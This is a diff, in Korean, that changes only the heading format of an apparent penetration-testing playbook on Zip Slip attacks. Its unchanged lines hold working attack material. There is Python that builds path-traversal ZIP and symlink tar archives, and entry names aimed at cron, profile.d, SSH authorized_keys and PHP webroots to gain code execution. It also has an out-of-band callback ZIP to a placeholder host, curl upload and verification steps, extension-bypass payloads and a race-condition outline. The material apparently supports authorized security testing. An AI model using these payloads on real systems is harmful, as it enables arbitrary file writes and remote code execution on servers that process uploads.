@@ -1,6 +1,6 @@
 ### 기본 페이로드
 
-**테스트 ZIP 생성 (Python):**
+#### 테스트 ZIP 생성 (Python)
 ```python
 import zipfile, io, time
 u = int(time.time())
@@ -15,7 +15,7 @@ with zipfile.ZipFile(buf, 'w') as zf:
 open('zipslip-test.zip', 'wb').write(buf.getvalue())
 ```
 
-**Entry name 변형 (path 변형):**
+#### Entry name 변형 (path 변형)
 - `../../public/<unique>.txt` (Linux 웹루트)
 - `..\..\public\<unique>.txt` (Windows backslash)
 - `/etc/cron.d/<unique>` (Linux 절대경로)
@@ -24,7 +24,7 @@ open('zipslip-test.zip', 'wb').write(buf.getvalue())
 - `..%2f..%2fetc%2fpasswd` (URL encoded — 일부 라이브러리 디코드)
 - `/var/www/html/<unique>.php` (PHP 실행 경로)
 
-**RCE 게이트 entry (실행 트리거 위치):**
+#### RCE 게이트 entry (실행 트리거 위치)
 - `/etc/cron.d/<unique>` — Linux cron (분당 실행)
 - `/etc/profile.d/<unique>.sh` — 셸 로그인 시
 - `~/.ssh/authorized_keys` — SSH 키 추가
@@ -33,7 +33,7 @@ open('zipslip-test.zip', 'wb').write(buf.getvalue())
 - `/var/www/html/<unique>.php` — 웹 실행
 - `/usr/local/bin/<unique>` (PATH 첫번째 디렉토리)
 
-**OAST 콜백 ZIP (Blind 검증):**
+#### OAST 콜백 ZIP (Blind 검증)
 ```python
 import zipfile, io, time
 oast = "https://CALLBACK.oast.fun"
@@ -48,7 +48,7 @@ with zipfile.ZipFile(buf, 'w') as zf:
 open('zipslip-oast.zip', 'wb').write(buf.getvalue())
 ```
 
-**Symlink ZIP (zipslip 대체):**
+#### Symlink ZIP (zipslip 대체)
 ```python
 import tarfile, io, time
 u = int(time.time())
@@ -61,7 +61,7 @@ with tarfile.open(fileobj=buf, mode='w') as tf:
 open('symlink-test.tar', 'wb').write(buf.getvalue())
 ```
 
-**검증 흐름:**
+#### 검증 흐름
 ```bash
 # 1. 업로드
 curl -X POST "https://target/api/upload" -H "Cookie: session=..." \
@@ -92,7 +92,7 @@ curl "https://target/zipslip-<TIMESTAMP>.txt"
 | 확장자 검증 | `evil.jpg.sh` (이중 확장자), `evil.jpg/../../etc/x` |
 | ZIP entry name 길이 제한 | 짧은 traversal `../x`, 단일 `../` 반복 |
 
-**TOCTOU race:**
+#### TOCTOU race
 ```python
 # 1. 정상 entry로 검증 통과
 # 2. 동시에 다른 프로세스가 ZIP 파일 자체 교체 (race)
